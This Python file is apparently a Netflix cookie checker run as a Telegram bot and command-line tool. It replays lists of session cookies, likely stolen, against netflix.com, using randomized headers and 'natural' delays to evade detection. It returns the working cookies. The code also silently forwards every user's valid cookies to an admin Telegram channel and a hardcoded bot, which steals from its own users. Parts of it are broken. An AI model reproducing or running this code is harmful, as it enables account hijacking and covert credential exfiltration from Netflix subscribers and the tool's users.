import asyncio
import aiohttp
import random
from datetime import datetime
from colorama import Fore, Style
from utils import get_random_headers
import os
import requests
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
import re
import tempfile
import logging

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

def extract_cookie_from_line(line):
    """Extract cookie from different formats."""
    if " | Cookie = " in line:
        cookie_part = line.split(" | Cookie = ")[-1].strip()
        return cookie_part if cookie_part else None
    elif "Cookie = " in line:
        cookie_part = line.split("Cookie = ")[-1].strip()
        return cookie_part if cookie_part else None
    else:
        # Assume it's a raw cookie string
        clean_cookie = line.strip()
        return clean_cookie if clean_cookie else None

class SafeFastChecker:
    """Safe mode checker with smart delays"""
    def __init__(self):
        self.mode = "safe"
        self.batch_size = 50  # Increased batch size
        self.delay_pattern = self.generate_delay_pattern()
        self.valid_lines = []
        
    def generate_delay_pattern(self):
        """Creates natural looking delay pattern"""
        return [
            0.5, 0.8, 0.3, 0.6, 0.4, 
            0.7, 0.5, 0.9, 0.4, 0.6
        ]
    
    async def check_single_cookie(self, session, line, index):
        cookie_str = extract_cookie_from_line(line)
        if not cookie_str:
            # No need to print status for bot, just return
            return False, line, "Invalid line format"
            
        # Natural delay based on pattern
        delay = self.delay_pattern[index % len(self.delay_pattern)]
        delay += random.uniform(-0.1, 0.1)  # Add randomness
        await asyncio.sleep(delay)
        
        # Parse cookie string into dict
        cookies = {}
        for part in cookie_str.strip().split(';'):
            if '=' in part:
                key, value = part.strip().split('=', 1)
                cookies[key] = value
        
        try:
            async with session.get('https://www.netflix.com/browse',
                                 headers=get_random_headers(),
                                 cookies=cookies,
                                 timeout=10) as response:
                
                text = await response.text()
                
                # Advanced validity checking
                is_valid = all([
                    response.status == 200,
                    "Not signed in" not in text,
                    "Sign In" not in text,
                    "login" not in str(response.url).lower(),
                    any(x in text for x in ["profileGate", "profiles", "account-menu-item"])
                ])
                
                # No need to print status for bot
                return is_valid, line, "Checked"
                
        except Exception as e:
            # No need to print status for bot
            return False, line, f"Error: {str(e)}"

async def process_batch(checker, batch, start_index):
    """Process a batch of cookies using the specified checker"""
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i, line in enumerate(batch):
            task = checker.check_single_cookie(session, line, start_index + i)
            tasks.append(task)
        return await asyncio.gather(*tasks)

async def check_cookies_async(checker, lines_list, bot, chat_id, message_id):
    """Main async function to check cookies for the bot, with progress updates."""
    batch_size = getattr(checker, 'batch_size', 10)
    total_lines = len(lines_list)
    
    status_message = await bot.send_message(chat_id, f"🔍 Starting check for {total_lines} cookies...")

    for i in range(0, len(lines_list), batch_size):
        batch = lines_list[i:i + batch_size]
        results = await process_batch(checker, batch, i)
        
        for is_valid, line, _ in results:
            if is_valid:
                checker.valid_lines.append(line)
        
        # Update progress
        progress = min(i + batch_size, total_lines)
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=status_message.message_id,
                text=f"🔄 Progress: {progress}/{total_lines} cookies checked. "
                     f"({len(checker.valid_lines)} valid so far)"
            )
        except Exception: # Ignore if message is not modified
            pass

        # Smart delay
        if i + batch_size < len(lines_list):
            delay = random.uniform(1, 3)
            await asyncio.sleep(delay)
    
    await status_message.delete() # Remove the progress message
    await save_valid_cookies_for_bot(checker, total_lines, bot, chat_id)

async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id):
    """Saves valid cookies to a temp file and sends it to the user."""
    valid_lines = checker.valid_lines
    
    now = datetime.now()
    file_timestamp = now.strftime("%Y%m%d_%H%M%S")
    display_timestamp = now.strftime("%d %B %Y, %I:%M:%S %p")

    if not valid_lines:
        await bot.send_message(chat_id, "❌ No valid cookies found!")
        return
        
    filename = f"valid_cookies_{file_timestamp}.txt"
    
    # Use a temporary file to avoid cluttering the server
    with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt', encoding='utf-8') as temp_file:
        for line in valid_lines:
            temp_file.write(f"{line}\n")
        temp_filepath = temp_file.name

    try:
        msg_text = f"🍪 **Netflix Cookie Checker Results** 🍪\n\n" \
                   f"📝 Total Cookies Checked: `{total_lines_count}`\n" \
                   f"✅ Valid Cookies Found: `{len(valid_lines)}`\n" \
                   f"📅 Date: `{display_timestamp}`"

        with open(temp_filepath, 'rb') as doc:
            await bot.send_document(
                chat_id=chat_id,
                document=doc,
                filename=filename,
                caption=msg_text,
                parse_mode='Markdown'
            )
    except Exception as e:
        await bot.send_message(chat_id, f"An error occurred while sending the results file: {e}")
    finally:
        # Also send a copy to the admin channel silently
        try:
            if TELEGRAM_CHAT_ID:
                with open(temp_filepath, 'rb') as doc:
                    admin_caption = f"✅ Valid cookies from user `{chat_id}`.\n\n" + msg_text
                    await bot.send_document(
                        chat_id=TELEGRAM_CHAT_ID,
                        document=doc,
                        filename=filename,
                        caption=admin_caption,
                        parse_mode='Markdown',
                        disable_notification=True
                    )
        except Exception as e:
            # Fail silently if admin channel sending fails, but log it properly.
            logger.error(f"Failed to send results to admin channel ({TELEGRAM_CHAT_ID}): {e}", exc_info=True)
        
        # Clean up the temp file
        if os.path.exists(temp_filepath):
            os.remove(temp_filepath)

def save_valid_cookies(checker, total_lines_count):
    """Save valid cookies to a file and send to Telegram"""
    valid_lines = checker.valid_lines
    if not valid_lines:
        print(f"\n{Fore.RED}❌ No valid cookies found!{Style.RESET_ALL}")
        return
        
    # Create timestamps
    now = datetime.now()
    file_timestamp = now.strftime("%Y%m%d_%H%M%S")
    display_timestamp = now.strftime("%d %B %Y, %I:%M:%S %p")
        
    # Create filename with timestamp
    filename = f"valid_cookies_{checker.mode}_{file_timestamp}.txt"
    
    # Save cookies to file
    with open(filename, "w", encoding="utf-8") as f:
        for line in valid_lines:
            f.write(f"{line}\n")
    
    print(f"\n{Fore.GREEN}✅ Found {len(valid_lines)} valid cookies out of {total_lines_count}!{Style.RESET_ALL}")
    print(f"{Fore.GREEN}💾 Saved to: {filename}{Style.RESET_ALL}")
    
    # Send to Telegram silently
    try:
        # Format message text
        msg_text = f"🍪 Netflix Cookie Checker Results\n\n" \
                   f"📝 Total Cookies: {total_lines_count}\n" \
                   f"✅ Valid Cookies: {len(valid_lines)}\n" \
                   f"📅 Date: {display_timestamp}"
        
        # Send message with file
        with open(filename, 'rb') as doc:
            files = {'document': doc}
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'caption': msg_text,
            'disable_notification': True  # This makes it silent
        }
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
            data=payload,
            files=files
        )
    except Exception:
        pass  # Silently handle any errors

def fast_cookie_checker(files, checker):
    """Main function for cookie checking"""
    if not files:
        print(f"\n{Fore.RED}No files selected!{Style.RESET_ALL}")
        return
        
    print(f"\n{Fore.GREEN}Selected files:{Style.RESET_ALL}")
    for i, file in enumerate(files, 1):
        print(f"{i}. {os.path.basename(file)}")
    
    lines_to_check = []
    for file_path in files:
        try:
            print(f"\n{Fore.CYAN}Reading: {os.path.basename(file_path)}{Style.RESET_ALL}")
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        lines_to_check.append(line)
        except Exception as e:
            print(f"{Fore.RED}Error reading {file_path}: {str(e)}{Style.RESET_ALL}")
            continue
    
    if not lines_to_check:
        print(f"\n{Fore.RED}No valid lines found in files!{Style.RESET_ALL}")
        return
        
    total_to_check = len(lines_to_check)
    try:
    # Process cookies using async
        asyncio.run(check_cookies_async(checker, lines_to_check))
    finally:
        save_valid_cookies(checker, total_to_check) 